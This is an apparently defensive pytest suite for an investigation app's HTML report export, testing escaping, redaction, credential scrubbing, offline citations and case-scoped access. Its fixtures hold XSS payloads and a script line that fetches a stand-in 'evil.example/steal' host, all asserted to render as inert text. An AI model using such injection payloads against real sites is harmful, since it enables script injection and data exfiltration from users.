"""HTML reports: selection, redaction, escaping, offline citations, uncertainty (AC 5, 6)."""

from __future__ import annotations

import re
import uuid
from html.parser import HTMLParser
from typing import Any

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session, sessionmaker

from app.config import Settings
from app.reports.redaction import CREDENTIAL, REDACTED, Redactor
from tests.ai_helpers import run_ai, run_indexing
from tests.conftest import (
    SECOND_PASSWORD,
    SECOND_USERNAME,
    browser_headers,
    create_case,
    create_second_user,
    import_file,
    login_as,
)

INTEGRATION = pytest.mark.integration

HOSTILE = (
    "<img src=x onerror=alert(1)><script>fetch('http://evil.example/steal')</script>"
    "Kayıt: ornek.example alan adı Ayşe Yılmaz tarafından 2026-09-01 tarihinde tescil edildi. "
    "Anahtar AIzaSyA0000000000000000000000000000000 ve telefon +1 202-555-0143."
)
ALLOWED_TAGS = {
    "html", "head", "meta", "title", "style", "body", "h1", "h2", "h3", "p", "span", "ul", "ol",
    "li", "pre", "table", "thead", "tbody", "tr", "th", "td", "a", "section", "em", "q", "br",
}  # fmt: skip
ALLOWED_ATTRIBUTES = {
    "lang", "charset", "http-equiv", "content", "name", "class", "id", "href", "rel",
    "referrerpolicy",
}  # fmt: skip


class _Audit(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.tags: set[str] = set()
        self.attributes: set[str] = set()
        self.ids: set[str] = set()
        self.hrefs: list[str] = []
        self.text: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.tags.add(tag)
        for name, value in attrs:
            self.attributes.add(name)
            if name == "id" and value:
                self.ids.add(value)
            if name == "href" and value:
                self.hrefs.append(value)

    def handle_data(self, data: str) -> None:
        self.text.append(data)


def _audit(markup: str) -> _Audit:
    audit = _Audit()
    audit.feed(markup)
    return audit


def test_redactor_removes_terms_and_credential_shaped_values() -> None:
    redact = Redactor(["Ayşe Yılmaz", "ornek"])
    text = redact(
        "AYŞE YILMAZ wrote from ornek.example; key AIzaSyA0000000000000000000000000000000; "
        "https://api.telegram.org/bot123456789:AAsyntheticBotToken_000000000000000/getChat and "
        "https://x.example/cb?access_token=abc123&page=2 Bearer abcdefghijklmnopqrstuv"
    )
    assert "Ayşe" not in text
    assert "ornek" not in text.lower()
    assert "AIzaSy" not in text
    assert "AAsynthetic" not in text
    assert "abc123" not in text
    assert "abcdefghijklmnop" not in text
    assert "page=2" in text
    assert text.count(REDACTED) == 2
    assert redact.redactions == 2
    assert redact.credentials == 4
    assert CREDENTIAL in text


def _setup(
    client: TestClient, authed: str, settings: Settings, factory: sessionmaker[Session]
) -> dict[str, Any]:
    case = create_case(
        client,
        authed,
        title="Rapor <script>alert('t')</script>",
        purpose="Purpose <iframe src=https://evil.example></iframe>",
    )
    _, hostile = import_file(
        client,
        authed,
        case["id"],
        HOSTILE.encode(),
        filename='"><svg onload=alert(1)>.txt',
        title="Kayıt <b onmouseover=alert(1)>özeti</b>",
        source_reference="javascript:alert(document.domain)",
    )
    _, plain = import_file(
        client,
        authed,
        case["id"],
        b"Server 203.0.113.7 answered for ornek.example on 2026-09-02.",
        title="Server note",
        source_reference="https://ornek.example/status?token=supersecretvalue123",
    )
    entities = []
    for name, identifiers in (
        ("<b>Örnek</b> A.Ş.", [{"identifier_type": "domain", "value": "ornek.example"}]),
        ("Ayşe Yılmaz", [{"identifier_type": "phone", "value": "+1 202-555-0143"}]),
    ):
        response = client.post(
            f"/api/v1/cases/{case['id']}/entities",
            json={"entity_type": "organization", "display_name": name, "identifiers": identifiers},
            headers=browser_headers(authed),
        )
        assert response.status_code == 201, response.text
        entities.append(response.json())
    relationship = client.post(
        f"/api/v1/cases/{case['id']}/relationships",
        json={
            "source_entity_id": entities[1]["id"],
            "target_entity_id": entities[0]["id"],
            "predicate": "registered_by",
            "description": "Registry text <script>x()</script>",
            "supporting_evidence_ids": [hostile["evidence"]["id"]],
        },
        headers=browser_headers(authed),
    )
    assert relationship.status_code == 201, relationship.text
    note = client.post(
        f"/api/v1/cases/{case['id']}/notes",
        json={
            "body": "Check <a href=javascript:alert(1)>this</a>",
            "evidence_id": plain["evidence"]["id"],
        },
        headers=browser_headers(authed),
    )
    assert note.status_code == 201, note.text

    run_indexing(settings, factory, case["id"])
    conversation = client.post(
        f"/api/v1/cases/{case['id']}/ai/conversations", json={}, headers=browser_headers(authed)
    ).json()
    run = client.post(
        f"/api/v1/cases/{case['id']}/ai/conversations/{conversation['id']}/questions",
        json={"question": "ornek.example alan adı hangi tarihte tescil edildi?"},
        headers=browser_headers(authed),
    ).json()
    assert run_ai(settings, factory, run["id"]) == "completed"
    messages = client.get(
        f"/api/v1/cases/{case['id']}/ai/conversations/{conversation['id']}"
    ).json()["messages"]
    answer = next(m for m in messages if m["role"] == "assistant")
    return {
        "case": case,
        "hostile": hostile["evidence"],
        "plain": plain["evidence"],
        "entities": entities,
        "relationship": relationship.json(),
        "note": note.json(),
        "answer": answer,
    }


@INTEGRATION
def test_report_escapes_hostile_content_redacts_and_keeps_citations_navigable_offline(
    client: TestClient, authed: str, settings: Settings, db_session_factory: sessionmaker[Session]
) -> None:
    setup = _setup(client, authed, settings, db_session_factory)
    case_id = setup["case"]["id"]
    selection = {
        "entity_ids": [e["id"] for e in setup["entities"]],
        "relationship_ids": [setup["relationship"]["id"]],
        "evidence_ids": [setup["plain"]["id"]],
        "comparison_entity_ids": [e["id"] for e in setup["entities"]],
        "ai_message_ids": [setup["answer"]["id"]],
        "note_ids": [setup["note"]["id"]],
        "include_timeline": True,
        "redact_terms": ["Ayşe Yılmaz"],
        "redact_identifier_types": ["phone"],
    }
    response = client.post(
        f"/api/v1/cases/{case_id}/reports/html/preview",
        json=selection,
        headers=browser_headers(authed),
    )
    assert response.status_code == 200, response.text
    preview = response.json()
    markup = preview["html"]
    audit = _audit(markup)

    # Only fixed, inert markup.
    assert audit.tags <= ALLOWED_TAGS, audit.tags - ALLOWED_TAGS
    assert audit.attributes <= ALLOWED_ATTRIBUTES, audit.attributes - ALLOWED_ATTRIBUTES
    assert "<script" not in markup.lower()
    assert not re.search(r"<[^>]+\son[a-z]+\s*=", markup, re.IGNORECASE)
    assert "default-src 'none'" in markup
    for href in audit.hrefs:
        assert href.startswith(("#", "https://", "http://")), href
        if href.startswith("#"):
            assert href[1:] in audit.ids, f"dangling citation link {href}"
    assert not any(href.startswith("http") and "evil.example" in href for href in audit.hrefs)
    assert "javascript:alert(document.domain)" in "".join(audit.text)  # shown as text only

    # Hostile text survives as visible text, not markup.
    text = "".join(audit.text)
    assert "<img src=x onerror=alert(1)>" in text
    assert "<svg onload=alert(1)>.txt" in text
    assert "<b>Örnek</b> A.Ş." in text

    # Redactions and credential scrubbing.
    assert "ayşe yılmaz" not in markup.lower()
    assert "202-555-0143" not in markup
    assert "AIzaSy" not in markup
    assert "supersecretvalue123" not in markup
    assert preview["redactions_applied"] > 0
    assert preview["credential_like_values_removed"] >= 2

    # Uncertainty and provenance are preserved.
    assert "AI-generated" in text
    assert "not analyst findings" in text
    assert "analyst assertion" in text
    assert "never merges entities automatically" in text
    assert "not a complete case export" in text
    assert "Collection dates and coverage gaps" in text
    assert "Timeline" in text
    assert "No observations match." in text
    assert "external original, not bundled" in text
    assert f"evidence-{setup['hostile']['id']}" in audit.ids  # bundled because cited
    assert f"evidence-{setup['plain']['id']}" in audit.ids
    listing = client.get(f"/api/v1/cases/{case_id}/reports/selectable").json()
    assert [item["id"] for item in listing["ai_answers"]] == [setup["answer"]["id"]]
    assert listing["ai_answers"][0]["detail"].startswith("AI-generated")
    ai_links = [h for h in audit.hrefs if h.startswith("#evidence-")]
    assert ai_links
    assert preview["counts"]["ai_answers"] == 1
    assert preview["counts"]["bundled_evidence"] >= 2
    assert any("AI-generated" in warning for warning in preview["warnings"])

    download = client.post(
        f"/api/v1/cases/{case_id}/reports/html", json=selection, headers=browser_headers(authed)
    )
    assert download.status_code == 200
    assert download.headers["content-type"].startswith("text/html")
    disposition = download.headers["content-disposition"]
    assert re.fullmatch(
        r'attachment; filename="tracehollow-report-[0-9a-f-]+-\d{8}T\d{6}Z\.html"', disposition
    )
    assert download.headers["content-security-policy"].startswith("sandbox;")
    assert download.headers["x-content-type-options"] == "nosniff"
    assert "<script" not in download.text.lower()


@INTEGRATION
def test_report_selection_is_explicit_case_scoped_and_member_only(
    client: TestClient, authed: str, settings: Settings, db_session_factory: sessionmaker[Session]
) -> None:
    case = create_case(client, authed)
    other = create_case(client, authed, title="Other")
    _, foreign = import_file(client, authed, other["id"], b"Other case secret content")
    url = f"/api/v1/cases/{case['id']}/reports/html/preview"

    listing = client.get(f"/api/v1/cases/{case['id']}/reports/selectable").json()
    assert listing["evidence"] == []
    assert set(listing) == {"entities", "relationships", "evidence", "ai_answers", "notes"}

    empty = client.post(url, json={}, headers=browser_headers(authed)).json()
    assert "Other case secret content" not in empty["html"]
    assert empty["counts"]["bundled_evidence"] == 0

    stolen = client.post(
        url, json={"evidence_ids": [foreign["evidence"]["id"]]}, headers=browser_headers(authed)
    )
    assert stolen.status_code == 404
    assert (
        client.post(
            url, json={"entity_ids": [str(uuid.uuid4())]}, headers=browser_headers(authed)
        ).status_code
        == 404
    )
    assert (
        client.post(
            url,
            json={"comparison_entity_ids": [str(uuid.uuid4())]},
            headers=browser_headers(authed),
        ).status_code
        == 422
    )
    assert (
        client.post(url, json={"unexpected": True}, headers=browser_headers(authed)).status_code
        == 422
    )

    create_second_user(db_session_factory)
    outsider = TestClient(client.app, base_url=str(client.base_url))
    csrf = login_as(outsider, SECOND_USERNAME, SECOND_PASSWORD)
    assert outsider.get(f"/api/v1/cases/{case['id']}/reports/selectable").status_code == 404
    for path in ("reports/html/preview", "reports/html"):
        response = outsider.post(
            f"/api/v1/cases/{case['id']}/{path}", json={}, headers=browser_headers(csrf)
        )
        assert response.status_code == 404
